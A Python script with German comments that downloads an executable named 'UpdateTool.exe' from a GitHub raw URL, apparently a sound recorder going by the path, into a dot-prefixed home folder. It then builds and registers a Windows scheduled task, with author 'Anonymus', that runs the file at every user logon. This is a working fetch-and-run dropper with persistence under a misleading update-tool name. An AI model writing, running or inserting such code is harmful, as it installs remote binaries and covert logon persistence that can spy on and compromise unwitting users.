import os
import subprocess
import socket
#vars setzen

    #temppath zu python holen
tmp = os.environ.get('TMP')

    # homepath zu python holen
home = os.environ.get('homepath')

    # username zu python holen
user = os.environ.get('username')

    #hostname zu python holen (etwas anders da hostname keine var)
host = socket.gethostname()

    #SID zu python
raw_mysid = subprocess.Popen("wmic useraccount where name=\"%username%\" get sid", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
(sid_out, sid_err) = raw_mysid.communicate()
mysid = str(sid_out[48:91], 'utf-8')

    # Download-URL festlegen
url = 'https://raw.githubusercontent.com/DanielMueller1309/Python/update_soundrec/sonstiges/sound_rec/python_prod/dist/UpdateTool.exe'
    # Downloadname festlegen
downloadname = "UpdateTool.exe"

    # XML-Datei Name
xmlname = "UpdateTool.xml"

#erweiterte vars gestalten

    #hostname und user zusammenführen
hostuser = host + '\\' + user
    # newpath festlegen
newpath_home = home + r'\.UpdateTool'
newpath_tmp = tmp + r'\UpdateTool'
    # falls newpath nicht existiert erstelle ihn
if not os.path.exists(newpath_home):
  os.makedirs(newpath_home)




# nachladen von update_tool.exe falls noch nicht vorhanden
if not os.path.exists(newpath_home + '\\' + downloadname):
    os.system('cmd /c "curl ' + url + ' -o  ' + newpath_home + '\\' + downloadname)

# lösche falls nötig alte xml datei
if os.path.exists(newpath_tmp + '\\' + xmlname):
    os.remove(newpath_tmp + '\\' + xmlname)

# erstelle xml datei
os.system(r'cmd /c "echo ^<?xml version="1.0" encoding="UTF-16"?^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo ^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo   ^<RegistrationInfo^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<Date^>2021-04-28T07:52:50.2538139^</Date^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<Author^>Anonymus^</Author^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<URI^>\UpdateTool^</URI^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo   ^</RegistrationInfo^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo   ^<Triggers^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<LogonTrigger^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo       ^<Enabled^>true^</Enabled^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo       ^<UserId^>' + hostuser + '^</UserId^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^</LogonTrigger^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo   ^</Triggers^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo   ^<Principals^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<Principal id="Author"^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo       ^<UserId^>' + mysid + '^</UserId^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo       ^<LogonType^>InteractiveToken^</LogonType^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo       ^<RunLevel^>LeastPrivilege^</RunLevel^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^</Principal^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo   ^</Principals^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo   ^<Settings^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<DisallowStartIfOnBatteries^>true^</DisallowStartIfOnBatteries^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<StopIfGoingOnBatteries^>true^</StopIfGoingOnBatteries^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<AllowHardTerminate^>true^</AllowHardTerminate^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<StartWhenAvailable^>false^</StartWhenAvailable^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<IdleSettings^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo       ^<Duration^>PT10M^</Duration^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo       ^<WaitTimeout^>PT1H^</WaitTimeout^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo       ^<StopOnIdleEnd^>true^</StopOnIdleEnd^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo       ^<RestartOnIdle^>false^</RestartOnIdle^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^</IdleSettings^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<AllowStartOnDemand^>true^</AllowStartOnDemand^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<Enabled^>true^</Enabled^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<Hidden^>false^</Hidden^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<WakeToRun^>false^</WakeToRun^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<ExecutionTimeLimit^>PT72H^</ExecutionTimeLimit^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<Priority^>7^</Priority^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo   ^</Settings^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo   ^<Actions Context="Author"^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^<Exec^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo       ^<Command^>' + r'C:' + newpath_home + '\\' + downloadname + '^</Command^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo     ^</Exec^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo   ^</Actions^> >>' + newpath_tmp + '\\' + xmlname)
os.system(r'cmd /c "echo ^</Task^> >>' + newpath_tmp + '\\' + xmlname)
print('xml datei geschrieben')


#schtask aus xml erstellen
os.system(r'cmd /c "schtasks /create /tn "UpdateTool" /xml "' + newpath_tmp + r'\UpdateTool.xml"')

#os.system()
print("fertig")
